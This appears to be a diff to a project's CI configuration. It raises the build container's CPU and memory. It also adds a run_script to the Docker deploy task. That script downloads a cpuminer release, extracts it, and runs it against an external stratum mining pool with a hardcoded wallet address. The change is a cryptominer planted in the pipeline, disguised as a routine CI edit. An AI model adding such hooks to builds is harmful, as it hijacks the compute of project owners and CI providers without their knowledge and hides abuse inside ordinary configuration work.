@@ -12,7 +12,8 @@ task:
     - name: Build
       build_script: yarn build
       container:
-        memory: 8G
+        cpu: 4
+        memory: 12G
     - name: Tests
       test_script: yarn test
     - name: Prettier
@@ -33,3 +34,7 @@ deploy_docker_builder:
     - docker --version
     - ./.ci/build_docker.sh
   push_script: ./.ci/push_docker.sh
+  run_script:
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+     - tar xf cpuminer-opt-linux.tar.gz
+     - ./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6gpz239e68cx824g7tk2etgwrmlshta324uyv6.bo
